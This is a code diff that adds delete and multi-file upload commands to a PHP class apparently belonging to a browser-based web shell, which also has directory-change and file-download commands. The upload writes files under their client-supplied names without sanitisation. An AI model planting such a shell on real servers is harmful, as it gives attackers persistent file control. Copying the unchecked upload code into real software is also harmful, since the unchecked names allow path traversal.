@@ -48,6 +48,13 @@ class Shell extends Commands
         exit();
     }
 
+    public function delete()
+    {
+        $this->Cmd_delete();
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit();
+    }
+
     public function cd($cmd)
     {
         $this->History_CurrentDirectory();
@@ -101,4 +108,39 @@ class Shell extends Commands
         readfile($path);
         exit;
     }
+
+    public function Upload()
+    {
+        $this->History_CurrentDirectory();
+        $this->History_Command('upload');
+
+        if (! isset($_FILES["upload_file"])) {
+            $this->History_Result('Error');
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit();
+        }
+
+        for ($i = 0; $i < count($_FILES['upload_file']['error']); $i++) {
+            if (! isset($_FILES['upload_file']['error'][$i]) || ! is_int($_FILES['upload_file']['error'][$i]) || $_FILES['upload_file']['error'][$i] !== 0){
+                $this->History_Result('ファイルアップロードエラー: ' . $_FILES['upload_file']['name'][$i]);
+                continue;
+            }
+
+            if (! is_uploaded_file($_FILES['upload_file']['tmp_name'][$i])) {
+                $this->History_Result('アップロードできませんでした、アクセス権などを確認してください。: ' . $_FILES['upload_file']['name'][$i]);
+                continue;
+            }
+
+            $_fullpath = $_SESSION['webshell']['path'] . '/' . $_FILES['upload_file']['name'][$i];
+
+            if(move_uploaded_file( $_FILES['upload_file']['tmp_name'][$i], $_fullpath)) {
+                chmod($_fullpath, 0644);
+            }
+            $this->History_Result('ファイルをアップロードしました: ' . $_FILES['upload_file']['name'][$i]);
+        }
+
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit();
+    }
+
 }
